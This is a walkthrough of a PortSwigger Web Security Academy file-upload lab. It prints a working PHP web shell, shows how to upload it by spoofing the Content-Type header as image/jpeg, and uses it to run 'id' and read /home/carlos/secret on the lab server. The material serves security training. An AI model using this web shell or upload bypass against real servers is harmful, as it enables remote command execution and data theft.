## Welcome, my friend. Today we will start the [2. File Upload lab](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass) in ```portswigger```

# Explain this Scenario:

## Scalable Web Shell

```
<?php echo system($_GET['command']); ?>
```

#### This code is an example of a ```"web shell"```, a type of malware that is uploaded to servers through security vulnerabilities.
#### The code executes operating system commands on the server. The command you want to execute is sent through the ```command``` parameter in the query.
#### For example, if you send the following query:


```
GET /example/exploit.php?command=id HTTP/1.1
```

### The ```id command``` will be executed on the server, which displays information about the user the server is running as.

#### When submitting an HTML form containing files, the browser typically uses the multipart/form-data content type to send binary data such as images or PDF documents.
#### Example of an HTTP request to send an image with a description and username:


```
POST /images HTTP/1.1
Host: normal-website.com
Content-Length: 12345
Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="image"; filename="example.jpg"
Content-Type: image/jpeg

[...binary content of example.jpg...]

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="description"

This is an interesting description of my image.

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="username"

wiener
---------------------------012345678901234567890123456--
```

#### If the site only expects certain file types such as ```image/jpeg```, there could be a validation error if the actual file content is not checked. For example, you may change the ```Content-Type``` header to an image type, when in reality the file may be malicious ```PHP code```.

# Let's play this lab:

#### Let's log in to your own account using the following credentials: ```wiener:peter```

![image](https://github.com/user-attachments/assets/1b7229a1-3813-48f9-b6f0-0dcc0d603e78)


#### Let's create a php malicious payload in file ```tor1.php```:

### within tor.php:

```
<?php
    echo system($_GET["tor"]);
?>
```

![image](https://github.com/user-attachments/assets/295203de-7776-489e-b02f-df7db4e826ee)

### Now, Let's upload this malicious payload to server.

#### Hmm ,Sorry! REALY?

### ok Let's open the burp tool to explore what happen.


![image](https://github.com/user-attachments/assets/298a289d-82c8-45e0-b675-9a8a4a4bda21)

#### Well, The problem was due to the ```Content-Type: application/x-php``` , we change to:

```
Content-Type: image/jpeg
```

![image](https://github.com/user-attachments/assets/bf4abe63-d67c-4089-b4b1-369628adb855)

#### WOW! The file has been uploaded successfully.

### From Task 1, we explore that our file is within this path ```/files/avatars/file_name?parameter=command``` like this:

```
https://0a3a00ad03921d72824516a00044003b.web-security-academy.net/files/avatars/tor.php?tor=id
```

![image](https://github.com/user-attachments/assets/32eb46a6-8b08-44a0-8376-92d1bd146f76)

#### Ok this task requrie reach to /home/carlos/secret file.

```
/files/avatars/tor.php?tor=cat /home/carlos/secret
```

![image](https://github.com/user-attachments/assets/152c9789-1f5a-40d9-8beb-5a4a5d6ca5b9)


#### alert: this secret is douple, copy single secret only.
### Let's Submit this secret using the button provided in the lab banner.

## Then ...
